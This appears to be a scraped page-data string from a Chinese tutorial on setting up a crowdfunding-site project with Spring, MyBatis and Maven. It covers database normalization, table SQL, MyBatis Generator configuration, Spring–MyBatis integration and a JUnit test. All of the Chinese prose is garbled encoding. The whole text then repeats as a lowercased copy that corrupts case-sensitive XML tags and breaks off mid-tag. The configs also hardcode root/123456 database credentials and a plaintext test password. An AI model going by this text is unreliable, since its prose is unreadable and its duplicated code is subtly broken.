¥é¨é¨ä¿¡æ¯ï¼åå·¥è¡¨ä¸­æ²¡æåå·¥ä¿¡æ¯çè®°å½åæ ·æ¯ éæ³è®°å½ã\n\n * å é¤å¼å¸¸ï¼å é¤åå·¥ä¿¡æ¯ä¼è¿å¸¦å é¤é¨é¨ä¿¡æ¯å¯¼è´é¨é¨ä¿¡æ¯æå¤ä¸¢å¤±ã\n\n * æ´æ°å¼å¸¸ï¼åªæåªä¿®æ¹ä¸ä¸ªé¨é¨çåç§°ä¹è¦æ´æ°å¤æ¡åå·¥è®°å½ã\n\næ­£ç¡®çåæ³æ¯ï¼æä¸è¡¨æåæä¸¤å¼ è¡¨ï¼ä»¥å¤é®å½¢å¼å³èã\n\n\n\nâé¨é¨ç¼å·âåâåå·¥ç¼å·âæ¯ç´æ¥ç¸å³çã ç¬¬ä¸èå¼çå¦ä¸ç§è¡¨è¿°æ¹å¼æ¯ï¼ä¸¤å¼ è¡¨è¦éè¿å¤é®å³èï¼ä¸ä¿å­åä½å­æ®µãä¾ å¦ï¼ä¸è½å¨âåå·¥è¡¨âä¸­å­å¨âé¨é¨åç§°âã\n\n# å®è·µé¨å\n\næä»¬å¨å®éçç©çå»ºæ¨¡é¨åå¾å¾å¹¶ä¸å¨é¨éµå¾ªèå¼çè¦æ±ãä¸å¤§èå¼æ¯è®¾è®¡æ°æ®åºè¡¨ç»æçè§åçº¦æï¼ä½æ¯å¨å®éå¼åä¸­åè®¸å±é¨åéã æ¯å¦ä¸ºäºå¿«éæ¥è¯¢å°å³èæ°æ®å¯è½ä¼åè®¸åä½å­æ®µçå­å¨ãä¾å¦å¨åå·¥è¡¨ä¸­å­å¨é¨é¨åç§°è½ç¶è¿èç¬¬ä¸èå¼ï¼ä½æ¯åå»äºå¯¹é¨é¨è¡¨çå³èæ¥è¯¢ã\n\nè®¾è®¡æè·¯ï¼æ ¹æ®ä¸å¡åè½è®¾è®¡æ°æ®åºè¡¨\n\n * çå¾è§çå­æ®µ\n   \n   è½å¤ä»éæ±ææ¡£æååé¡µé¢ä¸ç´æ¥çå°çæ°æ®é½éè¦è®¾è®¡å¯¹åºçæ° æ®åºè¡¨ãå­æ®µæ¥å­å¨ã\n\n * çä¸è§çå­æ®µ\n   \n   é¤äºè½å¤ç´æ¥ä»éæ±ææ¡£ä¸­çå°çå­æ®µï¼å®éå¼åä¸­å¾å¾è¿ä¼åå«ä¸ äºå¶ä»å­æ®µæ¥ä¿å­å¶ä»ç¸å³æ°æ®ã ä¾å¦ï¼ç®¡çåè¡¨éè¦åå¢å å¦ä¸å­æ®µä»¥æå©äºæ°æ®ç»´æ¤ï¼ä¸»é® ãåå»ºæ¶é´\n\n * åä½å­æ®µ\n   \n   ä¸ºäºé¿åå»ºè¡¨æ¶èèä¸å¨ææéæ¼ï¼å°åæåä¿®æ¹è¡¨ç»æéå¸¸éº»ç¦ï¼æä»¥ä¹æçå¢éä¼è®¾ç½®ä¸äºé¢å¤çåä½å­æ®µå¤ç¨ã\n\n * å®éå¼åå¯¹æ¥\n   \n   å®éå¼åä¸­é¤äºä¸äºåä¸ªæ¨¡åé½éè¦ä½¿ç¨çå¬å±è¡¨å¨é¡¹ç®å¯å¨æ¶å å»ºå¥½ï¼å¶ä»ä¸å±äºåä¸ªæ¨¡åçè¡¨ç±è¯¥æ¨¡åçè´è´£äººåå»ºãä½éå¸¸å¼åäººå ä¸è½ç´æ¥æä½æ°æ®åºæå¡å¨ï¼æä»¥éè¦æå»ºè¡¨ç SQL è¯­å¥åéç»è¿ç»´å·¥ç¨ å¸æ§è¡åå»ºæä½ã\n\n# SQL\n\n# åå»ºæ°æ®åº\nCREATE DATABASE\nIF\n\tNOT EXISTS pro_cf CHARACTER \n\tSET utf8;\n\nUSE pro_cf;\n\n# åå»ºç®¡çåè¡¨\nCREATE TABLE\nIF\n\tNOT EXISTS t_admin (\n    id VARCHAR ( 32 ) NOT NULL,\n    username VARCHAR ( 32 ) NOT NULL,\n    passwd VARCHAR ( 32 ) NOT NULL,\n    real_name VARCHAR ( 255 ),\n    email VARCHAR ( 255 ),\n    create_time VARCHAR ( 255 ),\n    PRIMARY KEY ( id ) \n  );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éåå·¥ç¨\n\n# å¼å¥ç¸å³ä¾èµ\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.cf</groupId>\n  <artifactId>cf-common-reverse</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>3.5.9</version>\n    </dependency>\n  </dependencies>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.mybatis.generator</groupId>\n        <artifactId>mybatis-generator-maven-plugin</artifactId>\n        <version>1.4.0</version>\n\n        \x3c!-- æä»¶çä¾èµ --\x3e\n        <dependencies>\n\n          \x3c!-- éåå·¥ç¨çæ ¸å¿ä¾èµ --\x3e\n          <dependency>\n            <groupId>org.mybatis.generator</groupId>\n            <artifactId>mybatis-generator-core</artifactId>\n            <version>1.4.0</version>\n          </dependency>\n\n          \x3c!-- æ°æ®åºè¿æ¥æ±  --\x3e\n          <dependency>\n            <groupId>com.mchange</groupId>\n            <artifactId>c3p0</artifactId>\n            <version>0.9.2</version>\n          </dependency>\n\n          <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.28</version>\n          </dependency>\n\n        </dependencies>\n      </plugin>\n    </plugins>\n  </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# éåå·¥ç¨XML\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n  \x3c!--\n        targetRuntime="MyBatis3Simple":çæç®åççCRUD\n        MyBatis3:è±ªåç\n     --\x3e\n  <context id="mysqlTables" targetRuntime="MyBatis3">\n\n    \x3c!--å»é¤æ³¨é--\x3e\n    <commentGenerator>\n      <property name="suppressAllComments" value="true"/>\n    </commentGenerator>\n\n    \x3c!-- jdbcConnectionï¼æå®å¦ä½è¿æ¥å°ç®æ æ°æ®åº --\x3e\n    <jdbcConnection driverClass="com.mysql.cj.jdbc.Driver"\n                    connectionURL="jdbc:mysql://localhost:3306/pro_cf?allowMultiQueries=true"\n                    userId="root"\n                    password="123456">\n    </jdbcConnection>\n\n    \x3c!--\n          é»è®¤ä¸ºfalse æJDBC DECIMALåNUMERICç±»åè§£æä¸ºInteger\n          ä¸ºtrueæ¶ æJDBC DECIMALåNUMERICç±»åè§£æä¸ºjava.math.BigDecimal\n          --\x3e\n    <javaTypeResolver >\n      <property name="forceBigDecimals" value="false" />\n    </javaTypeResolver>\n\n    \x3c!-- javaModelGeneratorï¼æå®javaBeanççæç­ç¥\n        targetPackage="test.model"ï¼ç®æ åå\n        targetProject="\\MBGTestProject\\src"ï¼ç®æ å·¥ç¨\n        --\x3e\n    <javaModelGenerator targetPackage="com.pwddd.cf.entity"\n                        targetProject="./src/main/java/">\n      \x3c!-- enableSubPackages:æ¯å¦è®© schema ä½ä¸ºåçåç¼ --\x3e\n      <property name="enableSubPackages" value="false" />\n      <property name="trimStrings" value="true" />\n    </javaModelGenerator>\n\n    \x3c!-- sqlMapGeneratorï¼sqlæ å°çæç­ç¥ï¼ --\x3e\n    <sqlMapGenerator targetPackage="mapper"\n                     targetProject="./src/main/resources/">\n      <property name="enableSubPackages" value="false" />\n    </sqlMapGenerator>\n\n    \x3c!-- javaClientGenerator:æå®mapperæ¥å£æå¨çä½ç½® --\x3e\n    <javaClientGenerator type="XMLMAPPER"\n                         targetPackage="com.pwddd.cf.mapper"\n                         targetProject="./src/main/java/">\n      <property name="enableSubPackages" value="false" />\n    </javaClientGenerator>\n\n    \x3c!-- æå®è¦éååæåªäºè¡¨ï¼æ ¹æ®è¡¨è¦åå»ºjavaBean --\x3e\n    <table tableName="t_admin" domainObjectName="Admin"></table>\n  </context>\n</generatorConfiguration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n# æ§è¡éåå·¥ç¨\n\nå°çæçMapperåå®ä½ç±»ç§»å¨å°æå®çä½ç½®ã\n\n\n# ä¾èµç®¡ç\n\n# çæ¬å£°æ\n\n<properties>\n  <spring.version>5.3.18</spring.version>\n  <spring.security.version>5.6.2</spring.security.version>\n  <cglib.version>3.3.0</cglib.version>\n  <aspectjweaver.version>1.9.9.1</aspectjweaver.version>\n  <druid.version>1.2.8</druid.version>\n  <mybatis.version>3.5.9</mybatis.version>\n  <mysql.version>8.0.28</mysql.version>\n  <mybatis-spring.version>2.0.6</mybatis-spring.version>\n  <pagehelper.version>5.2.0</pagehelper.version>\n  <jackson-core.version>2.13.2</jackson-core.version>\n  <jackson-databind.version>2.13.2.2</jackson-databind.version>\n</properties>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# ç¶é¡¹ç®ä¾èµç®¡ç\n\n<dependencyManagement>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-orm</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-webmvc</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-test</artifactId>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.aspectj</groupId>\n      <artifactId>aspectjweaver</artifactId>\n      <version>${aspectjweaver.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>cglib</groupId>\n      <artifactId>cglib</artifactId>\n      <version>${cglib.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>druid</artifactId>\n      <version>${druid.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>${mybatis.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>${mysql.version}</version>\n    </dependency>\n\n    \x3c!-- mybaits æ´å Spring   --\x3e\n    <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis-spring</artifactId>\n      <version>${mybatis-spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.github.pagehelper</groupId>\n      <artifactId>pagehelper</artifactId>\n      <version>${pagehelper.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>slf4j-api</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupId>ch.qos.logback</groupId>\n      <artifactId>logback-classic</artifactId>\n      <version>1.2.10</version>\n      <scope>test</scope>\n    </dependency>\n\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>jcl-over-slf4j</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.slf4j</groupId>\n      <artifactId>jul-to-slf4j</artifactId>\n      <version>1.7.36</version>\n    </dependency>\n\n    \x3c!-- Spring json   --\x3e\n    <dependency>\n      <groupId>com.fasterxml.jackson.core</groupId>\n      <artifactId>jackson-core</artifactId>\n      <version>${jackson-core.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>com.fasterxml.jackson.core</groupId>\n      <artifactId>jackson-databind</artifactId>\n      <version>${jackson-databind.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>jstl</artifactId>\n      <version>1.2</version>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>javax.servlet.jsp</groupId>\n      <artifactId>javax.servlet.jsp-api</artifactId>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.security</groupId>\n      <artifactId>spring-security-web</artifactId>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.security</groupId>\n      <artifactId>spring-security-config</artifactId>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n  </dependencies>\n</dependencyManagement>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n\n\n\n# SSMæ´å\n\n# Spring æ´å Mybatis\n\n> ç®æ ï¼ä½¿ç¨å®¹å¨ç®¡çMapperï¼å¨é¡¹ç®ä¸­å¯ä»¥ç´æ¥è°ç¨Mapperå®æå¢å æ¹æ¥ã\n\n# 0. å¼å¥ä¾èµ\n\nä¾èµçä½ç½®ï¼\n\n\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-webmvc</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-orm</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.aspectj</groupId>\n  <artifactId>aspectjweaver</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>cglib</groupId>\n  <artifactId>cglib</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.mybatis</groupId>\n  <artifactId>mybatis</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.mybatis</groupId>\n  <artifactId>mybatis-spring</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.github.pagehelper</groupId>\n  <artifactId>pagehelper</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-core</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-databind</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>javax.servlet</groupId>\n  <artifactId>jstl</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.google.code.gson</groupId>\n  <artifactId>gson</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n# 1. åå»ºjdbc.properties\n\njdbc.url=jdbc:mysql://localhost:3306/pro_cf\njdbc.username=root\njdbc.password=123456\njdbc.driver=com.mysql.cj.jdbc.Driver\n\n\n1\n2\n3\n4\n\n\n# 2. åå»ºmybatiså¨å±éç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n  \x3c!--  myabtis å¨å±éç½®   --\x3e\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. åå»ºspringæ´åmybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n  \x3c!--å è½½ æ°æ®æºéç½®--\x3e\n  <context:property-placeholder location="classpath:jdbc.properties" />\n\n  <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="url" value="${jdbc.url}" />\n    <property name="driverClassName" value="${jdbc.driver}" />\n    <property name="username" value="${jdbc.username}" />\n    <property name="password" value="${jdbc.password}" />\n  </bean>\n\n  <bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean">\n    \x3c!--éç½®æ°æ®æº--\x3e\n    <property name="dataSource" ref="dataSource" />\n    \x3c!--myabtiséç½®æä»¶ä½ç½®--\x3e\n    <property name="configLocation" value="classpath:mybatis-config.xml" />\n    \x3c!--mapper éç½®æä»¶ä½ç½®--\x3e\n    <property name="mapperLocations" value="classpath:mapper/*.xml" />\n  </bean>\n\n  \x3c!--æå®mapperæ¥å£æ«æ--\x3e\n  <bean id="mapperScannerConfigurer" class="org.mybatis.spring.mapper.MapperScannerConfigurer">\n    <property name="basePackage" value="com.pwddd.cf.mapper" />\n  </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4. springæ´åjunit5 æµè¯\n\nå¼å¥ä¾èµï¼\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-test</artifactId>\n  <scope>test</scope>\n</dependency>\n\n<dependency>\n  <groupId>org.junit.jupiter</groupId>\n  <artifactId>junit-jupiter-api</artifactId>\n  <scope>test</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næµè¯ä»£ç ï¼\n\npackage com.pwddd.cf;\n\nimport com.pwddd.cf.entity.Admin;\nimport com.pwddd.cf.mapper.AdminMapper;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.junit.jupiter.SpringJUnitConfig;\n\nimport javax.sql.DataSource;\nimport java.sql.SQLException;\nimport java.util.UUID;\n\n@SpringJUnitConfig(locations = {"classpath:spring-mybatis.xml"})\npublic class MybatisTest {\n\n    @Autowired\n    private DataSource dataSource;\n\n    @Autowired\n    private AdminMapper adminMapper;\n\n    @Test\n    public void testDateSource() throws SQLException {\n        System.out.println(dataSource.getConnection());\n    }\n\n    @Test\n    public void testMapper(){\n        Admin admin = new Admin(UUID.randomUUID().toString().replace("-",""),\n                "admin", "123456", "zhangsan", "admin@qq.com", null);\n        adminMapper.insertSelective(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'# å°ç­¹ç½\n\n\n# ç®ä»\n\n> å°ç­¹ç½é¡¹ç®å®ä½ä¸ºï¼ä»åä½åºç¨æ¶æå°å¾®æå¡æ¶æè¿æ¸¡çå¥é¨é¡¹ç®ï¼é¡¹ç®åå°åºäºä¼ ç»çssmæ¡æ¶ã\n\n\n# ç¯å¢æ­å»º\n\n\n# åå»ºé¡¹ç®\n\né¡¹ç®ä¹é´çå³ç³»ä¾èµå¾ï¼\n\næ ¹æ®å³ç³»åå»ºå¯¹åºçmavené¡¹ç®ã\n\n\n\nå¹¶è¡¨ç¤ºä»¥ä¸çå¯¹åºå³ç³»ã(ä»¥webuiä¾èµcomponentä¸ºä¾)\n\n<dependencies>\n  <dependency>\n    <groupid>com.pwddd.cf</groupid>\n    <artifactid>cf-admin-component</artifactid>\n    <version>1.0-snapshot</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ°æ®åºè®¾è®¡\n\n# ç©çå»ºæ¨¡\n\n# çè®ºé¨å\n\nç¬¬ä¸èå¼ï¼æ°æ®åºè¡¨ä¸­çæ¯ä¸åé½ä¸å¯ååï¼ä¹å°±æ¯åå­æ§\n\n\n\nè¿ä¸ªè¡¨ä¸­âé¨é¨âåâå²ä½âåºè¯¥æåæä¸¤ä¸ªå­æ®µï¼âé¨é¨åç§°âãâå²ä½âãè¿æ ·æè½å¤ä¸é¨éå¯¹âé¨é¨âæâå²ä½âè¿è¡æ¥è¯¢ã\n\n\n\nç¬¬äºèå¼ï¼å¨æ»¡è¶³ç¬¬ä¸èå¼åºç¡ä¸è¦æ±æ¯ä¸ªå­æ®µé½åä¸»é®å®æ´ç¸å³ï¼èä¸æ¯ä»åä¸»é®é¨åç¸å³ï¼ä¸»è¦éå¯¹èåä¸»é®èè¨ï¼\n\n\n\nâè®¢åè¯¦æè¡¨âä½¿ç¨âè®¢åç¼å·âåâäº§åç¼å·âä½ä¸ºèåä¸»é®ãæ­¤æ¶âäº§åä»·æ ¼âãâäº§åæ°éâé½åèåä¸»é®æ´ä½ç¸å³ï¼ä½âè®¢åéé¢âåâä¸åæ¶é´â åªåèåä¸»é®ä¸­çâè®¢åç¼å·âç¸å³ï¼åâäº§åç¼å·âæ å³ãæä»¥åªå³èäºä¸»é®ä¸­çé¨åå­æ®µï¼ä¸æ»¡è¶³ç¬¬äºèå¼ãæâè®¢åéé¢âåâä¸åæ¶é´âç§»å°è®¢åè¡¨å°±ç¬¦åç¬¬äºèå¼äºã\n\n\n\nç¬¬ä¸èå¼ï¼è¡¨ä¸­çéä¸»é®å­æ®µåä¸»é®å­æ®µç´æ¥ç¸å³ï¼ä¸åè®¸é´æ¥ç¸å³ã\n\n\n\nä¸é¢è¡¨ä¸­çâé¨é¨åç§°âåâåå·¥ç¼å·âçå³ç³»æ¯âåå·¥ç¼å·âââé¨é¨ç¼å·âââé¨é¨åç§°âï¼ä¸æ¯ç´æ¥ç¸å³ãæ­¤æ¶ä¼å¸¦æ¥ä¸åé®é¢ï¼\n\n * æ°æ®åä½ï¼âé¨é¨åç§°âå¤æ¬¡éå¤åºç°ã\n\n * æå¥å¼å¸¸ï¼ç»å»ºä¸ä¸ªæ°é¨é¨æ¶æ²¡æåå·¥ä¿¡æ¯ï¼ä¹å°±æ æ³åç¬æå¥é¨é¨ ä¿¡æ¯ãå°±ç®å¼ºè¡æå¥é¨é¨ä¿¡æ¯ï¼åå·¥è¡¨ä¸­æ²¡æåå·¥ä¿¡æ¯çè®°å½åæ ·æ¯ éæ³è®°å½ã\n\n * å é¤å¼å¸¸ï¼å é¤åå·¥ä¿¡æ¯ä¼è¿å¸¦å é¤é¨é¨ä¿¡æ¯å¯¼è´é¨é¨ä¿¡æ¯æå¤ä¸¢å¤±ã\n\n * æ´æ°å¼å¸¸ï¼åªæåªä¿®æ¹ä¸ä¸ªé¨é¨çåç§°ä¹è¦æ´æ°å¤æ¡åå·¥è®°å½ã\n\næ­£ç¡®çåæ³æ¯ï¼æä¸è¡¨æåæä¸¤å¼ è¡¨ï¼ä»¥å¤é®å½¢å¼å³èã\n\n\n\nâé¨é¨ç¼å·âåâåå·¥ç¼å·âæ¯ç´æ¥ç¸å³çã ç¬¬ä¸èå¼çå¦ä¸ç§è¡¨è¿°æ¹å¼æ¯ï¼ä¸¤å¼ è¡¨è¦éè¿å¤é®å³èï¼ä¸ä¿å­åä½å­æ®µãä¾ å¦ï¼ä¸è½å¨âåå·¥è¡¨âä¸­å­å¨âé¨é¨åç§°âã\n\n# å®è·µé¨å\n\næä»¬å¨å®éçç©çå»ºæ¨¡é¨åå¾å¾å¹¶ä¸å¨é¨éµå¾ªèå¼çè¦æ±ãä¸å¤§èå¼æ¯è®¾è®¡æ°æ®åºè¡¨ç»æçè§åçº¦æï¼ä½æ¯å¨å®éå¼åä¸­åè®¸å±é¨åéã æ¯å¦ä¸ºäºå¿«éæ¥è¯¢å°å³èæ°æ®å¯è½ä¼åè®¸åä½å­æ®µçå­å¨ãä¾å¦å¨åå·¥è¡¨ä¸­å­å¨é¨é¨åç§°è½ç¶è¿èç¬¬ä¸èå¼ï¼ä½æ¯åå»äºå¯¹é¨é¨è¡¨çå³èæ¥è¯¢ã\n\nè®¾è®¡æè·¯ï¼æ ¹æ®ä¸å¡åè½è®¾è®¡æ°æ®åºè¡¨\n\n * çå¾è§çå­æ®µ\n   \n   è½å¤ä»éæ±ææ¡£æååé¡µé¢ä¸ç´æ¥çå°çæ°æ®é½éè¦è®¾è®¡å¯¹åºçæ° æ®åºè¡¨ãå­æ®µæ¥å­å¨ã\n\n * çä¸è§çå­æ®µ\n   \n   é¤äºè½å¤ç´æ¥ä»éæ±ææ¡£ä¸­çå°çå­æ®µï¼å®éå¼åä¸­å¾å¾è¿ä¼åå«ä¸ äºå¶ä»å­æ®µæ¥ä¿å­å¶ä»ç¸å³æ°æ®ã ä¾å¦ï¼ç®¡çåè¡¨éè¦åå¢å å¦ä¸å­æ®µä»¥æå©äºæ°æ®ç»´æ¤ï¼ä¸»é® ãåå»ºæ¶é´\n\n * åä½å­æ®µ\n   \n   ä¸ºäºé¿åå»ºè¡¨æ¶èèä¸å¨ææéæ¼ï¼å°åæåä¿®æ¹è¡¨ç»æéå¸¸éº»ç¦ï¼æä»¥ä¹æçå¢éä¼è®¾ç½®ä¸äºé¢å¤çåä½å­æ®µå¤ç¨ã\n\n * å®éå¼åå¯¹æ¥\n   \n   å®éå¼åä¸­é¤äºä¸äºåä¸ªæ¨¡åé½éè¦ä½¿ç¨çå¬å±è¡¨å¨é¡¹ç®å¯å¨æ¶å å»ºå¥½ï¼å¶ä»ä¸å±äºåä¸ªæ¨¡åçè¡¨ç±è¯¥æ¨¡åçè´è´£äººåå»ºãä½éå¸¸å¼åäººå ä¸è½ç´æ¥æä½æ°æ®åºæå¡å¨ï¼æä»¥éè¦æå»ºè¡¨ç sql è¯­å¥åéç»è¿ç»´å·¥ç¨ å¸æ§è¡åå»ºæä½ã\n\n# sql\n\n# åå»ºæ°æ®åº\ncreate database\nif\n\tnot exists pro_cf character \n\tset utf8;\n\nuse pro_cf;\n\n# åå»ºç®¡çåè¡¨\ncreate table\nif\n\tnot exists t_admin (\n    id varchar ( 32 ) not null,\n    username varchar ( 32 ) not null,\n    passwd varchar ( 32 ) not null,\n    real_name varchar ( 255 ),\n    email varchar ( 255 ),\n    create_time varchar ( 255 ),\n    primary key ( id ) \n  );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éåå·¥ç¨\n\n# å¼å¥ç¸å³ä¾èµ\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.cf</groupid>\n  <artifactid>cf-common-reverse</artifactid>\n  <version>1.0-snapshot</version>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis</artifactid>\n      <version>3.5.9</version>\n    </dependency>\n  </dependencies>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupid>org.mybatis.generator</groupid>\n        <artifactid>mybatis-generator-maven-plugin</artifactid>\n        <version>1.4.0</version>\n\n        \x3c!-- æä»¶çä¾èµ --\x3e\n        <dependencies>\n\n          \x3c!-- éåå·¥ç¨çæ ¸å¿ä¾èµ --\x3e\n          <dependency>\n            <groupid>org.mybatis.generator</groupid>\n            <artifactid>mybatis-generator-core</artifactid>\n            <version>1.4.0</version>\n          </dependency>\n\n          \x3c!-- æ°æ®åºè¿æ¥æ±  --\x3e\n          <dependency>\n            <groupid>com.mchange</groupid>\n            <artifactid>c3p0</artifactid>\n            